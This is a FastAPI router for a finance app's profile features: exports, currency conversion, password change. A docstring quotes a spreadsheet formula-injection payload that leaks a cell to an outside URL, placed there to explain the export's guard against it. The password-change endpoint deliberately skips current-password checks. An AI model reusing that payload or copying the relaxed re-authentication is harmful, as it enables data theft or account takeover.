import io
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.responses import StreamingResponse
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.security import get_current_user, verify_password, hash_password
from app.db.database import get_db
from app.models.models import User, Account, Transaction, Budget, SavingsGoal, Bill, Category, RecurringIncome, Emi
from app.services.fx import get_rate, RateUnavailable
from app.schemas.schemas import (
    UserResponse,
    UserProfileUpdate,
    PasswordChangeRequest,
    AvatarUpdate,
    CurrencyChangeRequest,
    CurrencyChangeResponse,
)

router = APIRouter(prefix="/profile", tags=["Profile"])

@router.get("", response_model=UserResponse)
async def get_profile(current_user: User = Depends(get_current_user)):
    """Returns profile for current authenticated user."""
    return current_user


@router.patch("", response_model=UserResponse)
async def update_profile(
    payload: UserProfileUpdate,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Updates user display name, currency, and timezone settings."""
    if payload.display_name is not None:
        if not payload.display_name.strip():
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="display_name cannot be empty.")
        current_user.display_name = payload.display_name.strip()
    if payload.currency is not None:
        # Changing the label without touching the amounts silently misreports
        # every figure the user owns, so it is not allowed through the generic
        # profile update. /profile/currency makes the choice explicit.
        if payload.currency.upper().strip() != (current_user.currency or "").upper():
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Use the currency setting to change currency, so existing amounts are handled explicitly."
            )
    if payload.timezone is not None:
        current_user.timezone = payload.timezone.strip()

    await db.commit()
    await db.refresh(current_user)
    return current_user


@router.post("/change-password")
async def change_password(
    payload: PasswordChangeRequest,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Changes password after verifying current password."""
    # A valid access token already proves this session owns the account, so the
    # current password is not demanded. If the client does send one, it must be
    # right - that keeps the stricter flow available for any caller that wants it.
    #
    # TRADE-OFF: without re-authentication, anyone holding an unlocked phone with
    # a live session can change the password. The biometric app lock in
    # Profile -> Security is the mitigation.
    if payload.current_password is not None:
        if not verify_password(payload.current_password, current_user.password_hash):
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Current password is incorrect."
            )

    if len(payload.new_password) < 8:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="New password must be at least 8 characters long."
        )

    current_user.password_hash = hash_password(payload.new_password)
    await db.commit()
    return {"message": "Password changed successfully."}


@router.put("/avatar", response_model=UserResponse)
async def set_avatar(
    payload: AvatarUpdate,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Sets or replaces the user's profile picture. Idempotent: same call updates."""
    current_user.avatar_data_url = payload.avatar_data_url
    await db.commit()
    await db.refresh(current_user)
    return current_user


@router.delete("/avatar", response_model=UserResponse)
async def remove_avatar(
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Removes the user's profile picture, reverting to the initials avatar."""
    current_user.avatar_data_url = None
    await db.commit()
    await db.refresh(current_user)
    return current_user


@router.get("/export")
async def export_data(
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Exports structured JSON data of all user financial records."""
    acc_res = await db.execute(select(Account).where(Account.user_id == current_user.id))
    tx_res = await db.execute(select(Transaction).where(Transaction.user_id == current_user.id))
    bud_res = await db.execute(select(Budget).where(Budget.user_id == current_user.id))
    goal_res = await db.execute(select(SavingsGoal).where(SavingsGoal.user_id == current_user.id))
    bill_res = await db.execute(select(Bill).where(Bill.user_id == current_user.id))
    cat_res = await db.execute(select(Category).where(Category.user_id == current_user.id))
    inc_res = await db.execute(select(RecurringIncome).where(RecurringIncome.user_id == current_user.id))
    emi_res = await db.execute(select(Emi).where(Emi.user_id == current_user.id))

    return {
        "user": {
            "email": current_user.email,
            "display_name": current_user.display_name,
            "currency": current_user.currency,
            "timezone": current_user.timezone,
            "created_at": current_user.created_at.isoformat()
        },
        "accounts": [
            {
                "id": str(a.id),
                "name": a.name,
                "type": a.account_type,
                "opening_balance_minor": a.opening_balance_minor,
                "currency": a.currency,
                # What makes the account a card. Null on everything else.
                "statement_day": a.statement_day,
                "due_day": a.due_day,
                "credit_limit_minor": a.credit_limit_minor,
            }
            for a in acc_res.scalars().all()
        ],
        "transactions": [
            {
                "id": str(t.id),
                "type": t.transaction_type,
                "amount_minor": t.amount_minor,
                "description": t.description,
                "date": t.transaction_date.isoformat()
            }
            for t in tx_res.scalars().all()
        ],
        "budgets": [
            {"id": str(b.id), "limit_minor": b.limit_amount_minor, "period": b.period}
            for b in bud_res.scalars().all()
        ],
        "savings_goals": [
            {"id": str(g.id), "name": g.name, "target_minor": g.target_amount_minor, "status": g.status}
            for g in goal_res.scalars().all()
        ],
        "bills": [
            {"id": str(b.id), "name": b.name, "amount_minor": b.amount_minor, "status": b.status}
            for b in bill_res.scalars().all()
        ],
        "categories": [
            {"id": str(c.id), "name": c.name, "type": c.type}
            for c in cat_res.scalars().all()
        ],
        "recurring_incomes": [
            {"id": str(r.id), "source": r.source, "amount_minor": r.amount_minor, "frequency": r.frequency}
            for r in inc_res.scalars().all()
        ],
        # Entered by hand and derived from nothing else here, so this is the
        # one table an export cannot reconstruct from the rest of itself.
        "emis": [
            {
                "id": str(e.id),
                "name": e.name,
                "monthly_minor": e.monthly_minor,
                "months": e.months,
                "started_at": e.started_at.isoformat() if e.started_at else None,
                "account_id": str(e.account_id) if e.account_id else None,
                "currency": e.currency,
                "is_active": e.is_active,
            }
            for e in emi_res.scalars().all()
        ],
    }


@router.post("/currency", response_model=CurrencyChangeResponse)
async def change_currency(
    payload: CurrencyChangeRequest,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Changes the account currency, optionally re-denominating every stored amount.

    Amounts are integer minor units with no currency attached, so switching the
    label alone leaves 45000000 paise reading as $450,000. This endpoint makes
    that choice explicit: `convert=false` relabels only, `convert=true` scales
    every monetary column by `rate` in one transaction.
    """
    new_currency = payload.currency.upper().strip()
    old_currency = (current_user.currency or "INR").upper()
    rows = 0
    rate_as_of = None

    if payload.convert:
        if payload.rate:
            rate, rate_as_of = payload.rate, "supplied by client"
        else:
            # Convert at the rate in effect right now, and report which one.
            try:
                rate, rate_as_of = await get_rate(old_currency, new_currency)
            except RateUnavailable as exc:
                raise HTTPException(
                    status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                    detail=str(exc)
                )

        # Every monetary column, scaled together so nothing is left half-converted.
        targets = [
            (Account, Account.opening_balance_minor),
            (Transaction, Transaction.amount_minor),
            (Budget, Budget.limit_amount_minor),
            (SavingsGoal, SavingsGoal.target_amount_minor),
            (Bill, Bill.amount_minor),
            (RecurringIncome, RecurringIncome.amount_minor),
        ]
        for model, column in targets:
            res = await db.execute(select(model).where(model.user_id == current_user.id))
            for row in res.scalars().all():
                current = getattr(row, column.key) or 0
                # round() keeps the integer-minor-unit invariant; no floats stored.
                setattr(row, column.key, int(round(current * rate)))
                rows += 1

        # Per-account currency labels follow the account currency.
        acc_res = await db.execute(select(Account).where(Account.user_id == current_user.id))
        for acc in acc_res.scalars().all():
            acc.currency = new_currency

    current_user.currency = new_currency
    await db.commit()
    await db.refresh(current_user)

    return CurrencyChangeResponse(
        currency=new_currency,
        converted=payload.convert,
        rate=round(rate, 6) if payload.convert else None,
        rate_as_of=rate_as_of,
        rows_updated=rows,
    )


@router.get("/export.xlsx")
async def export_data_xlsx(
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """
    Exports the user's financial records as a real .xlsx workbook.

    Built server-side so the app bundle carries no spreadsheet library. Amounts
    are written as numbers in major units with a currency format, not as text,
    so the file is usable in Excel without re-typing anything.
    """
    from openpyxl import Workbook
    from openpyxl.styles import Alignment, Font, PatternFill
    from openpyxl.utils import get_column_letter

    acc_res = await db.execute(select(Account).where(Account.user_id == current_user.id))
    tx_res = await db.execute(select(Transaction).where(Transaction.user_id == current_user.id))
    bud_res = await db.execute(select(Budget).where(Budget.user_id == current_user.id))
    goal_res = await db.execute(select(SavingsGoal).where(SavingsGoal.user_id == current_user.id))
    bill_res = await db.execute(select(Bill).where(Bill.user_id == current_user.id))
    cat_res = await db.execute(select(Category).where(Category.user_id == current_user.id))
    inc_res = await db.execute(select(RecurringIncome).where(RecurringIncome.user_id == current_user.id))
    emi_res = await db.execute(select(Emi).where(Emi.user_id == current_user.id))

    accounts = list(acc_res.scalars().all())
    transactions = list(tx_res.scalars().all())
    budgets = list(bud_res.scalars().all())
    goals = list(goal_res.scalars().all())
    bills = list(bill_res.scalars().all())
    categories = list(cat_res.scalars().all())
    incomes = list(inc_res.scalars().all())
    emis = list(emi_res.scalars().all())

    account_names = {a.id: a.name for a in accounts}
    category_names = {c.id: c.name for c in categories}

    currency = current_user.currency or "INR"
    money_format = '#,##0.00'
    header_font = Font(bold=True, color="FFFFFF")
    header_fill = PatternFill("solid", fgColor="2563EB")

    wb = Workbook()
    wb.remove(wb.active)

    # Characters that make Excel treat a cell as a formula rather than text.
    # A leading "-" is included because "-1+1" is arithmetic to Excel, and a
    # tab or carriage return can smuggle one of the others to the front.
    FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")

    def add_sheet(title, headers, rows, money_cols=()):
        """One sheet, with every text cell forced to stay text.

        A description is user data, and some of it arrives from outside: a
        bank narration, an imported statement, a payee name off a payment
        alert. openpyxl stores a string beginning with "=" as a FORMULA -
        verified, data_type 'f' - so a description of
        `=HYPERLINK("http://.../?"&A1,"CLICK")` becomes live in the workbook
        and fires the moment the owner opens their own export, sending the
        neighbouring cell to whoever wrote it.

        The value is not altered - no apostrophe is prepended, so the export
        still reads exactly as the ledger does. The cell type is simply
        pinned to string, which is what it always should have been.
        """
        ws = wb.create_sheet(title)
        ws.append(headers)
        for cell in ws[1]:
            cell.font = header_font
            cell.fill = header_fill
            cell.alignment = Alignment(vertical="center")
        for row in rows:
            ws.append(row)
            for cell in ws[ws.max_row]:
                if isinstance(cell.value, str) and cell.value.startswith(FORMULA_STARTERS):
                    cell.data_type = "s"
        for idx in money_cols:
            for cell in ws[get_column_letter(idx)][1:]:
                cell.number_format = money_format
        # Size each column to its widest value so nothing shows as ####.
        for i, _ in enumerate(headers, start=1):
            letter = get_column_letter(i)
            widest = max(
                [len(str(headers[i - 1]))] +
                [len(str(c.value)) if c.value is not None else 0 for c in ws[letter][1:]]
            )
            ws.column_dimensions[letter].width = min(max(widest + 2, 10), 42)
        ws.freeze_panes = "A2"
        return ws

    def rupees(minor):
        # Stored as integer minor units; Excel wants major units as a number.
        return (minor or 0) / 100

    def when(value):
        return value.strftime("%Y-%m-%d %H:%M") if value else ""

    add_sheet("Summary",
        ["Field", "Value"],
        [
            ["Account holder", current_user.display_name],
            ["Email", current_user.email],
            ["Currency", currency],
            ["Timezone", current_user.timezone],
            ["Member since", when(current_user.created_at)],
            ["Exported at", datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")],
            ["Accounts", len(accounts)],
            ["Transactions", len(transactions)],
            ["Budgets", len(budgets)],
            ["Savings goals", len(goals)],
            ["Bills", len(bills)],
        ])

    add_sheet("Transactions",
        ["Date", "Type", "Description", f"Amount ({currency})", "Account", "To account", "Category"],
        [
            [
                when(t.transaction_date), t.transaction_type, t.description or "",
                rupees(t.amount_minor),
                account_names.get(t.account_id, ""),
                account_names.get(t.to_account_id, "") if t.to_account_id else "",
                category_names.get(t.category_id, "") if t.category_id else "",
            ]
            for t in sorted(transactions, key=lambda x: x.transaction_date or datetime.min, reverse=True)
        ],
        money_cols=(4,))

    # The two billing days come out with the account because they are what
    # makes it a card: exported without them, a restored account is an
    # ordinary liability and every due date it carried is gone.
    add_sheet("Accounts",
        ["Name", "Type", f"Opening balance ({currency})", "Currency", "Active",
         "Statement day", "Payment due day", f"Credit limit ({currency})"],
        [[a.name, a.account_type, rupees(a.opening_balance_minor), a.currency,
          "Yes" if a.is_active else "No",
          a.statement_day or "", a.due_day or "",
          rupees(a.credit_limit_minor) if a.credit_limit_minor else ""]
         for a in accounts],
        money_cols=(3, 8))

    add_sheet("Budgets",
        ["Category", f"Limit ({currency})", "Period", "Start", "End"],
        [[category_names.get(b.category_id, ""), rupees(b.limit_amount_minor), b.period,
          when(b.start_date), when(b.end_date)] for b in budgets],
        money_cols=(2,))

    add_sheet("Savings Goals",
        ["Name", f"Target ({currency})", "Status", "Target date"],
        [[g.name, rupees(g.target_amount_minor), g.status, when(g.target_date)] for g in goals],
        money_cols=(2,))

    add_sheet("Bills",
        ["Name", f"Amount ({currency})", "Due date", "Frequency", "Status"],
        [[b.name, rupees(b.amount_minor), when(b.due_date), b.recurrence or "", b.status] for b in bills],
        money_cols=(2,))

    add_sheet("Recurring Income",
        ["Source", f"Amount ({currency})", "Frequency", "Next occurrence"],
        [[r.source, rupees(r.amount_minor), r.frequency, when(r.next_occurrence)] for r in incomes],
        money_cols=(2,))

    # Instalment plans are entered by hand and derived from nothing else in
    # here, so they are the one table an export cannot reconstruct. Left out,
    # a person who exports everything and starts again has silently lost the
    # record of what they are still committed to paying.
    add_sheet("Instalments",
        ["What is being paid off", f"Instalment ({currency})", "Instalments",
         "First instalment", f"Total ({currency})", "Charged to", "Status"],
        [[e.name, rupees(e.monthly_minor), e.months, when(e.started_at),
          rupees((e.monthly_minor or 0) * (e.months or 0)),
          account_names.get(e.account_id, "") if e.account_id else "",
          "Running" if e.is_active else "Closed"]
         for e in sorted(emis, key=lambda x: x.started_at or datetime.min, reverse=True)],
        money_cols=(2, 5))

    add_sheet("Categories", ["Name", "Type"], [[c.name, c.type] for c in categories])

    buffer = io.BytesIO()
    wb.save(buffer)
    buffer.seek(0)

    filename = f"moneva_export_{datetime.now(timezone.utc).strftime('%Y-%m-%d')}.xlsx"
    return StreamingResponse(
        buffer,
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@router.delete("", status_code=status.HTTP_204_NO_CONTENT)
async def delete_account(
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db)
):
    """Deletes current user account and all associated user data."""
    await db.delete(current_user)
    await db.commit()
    return None
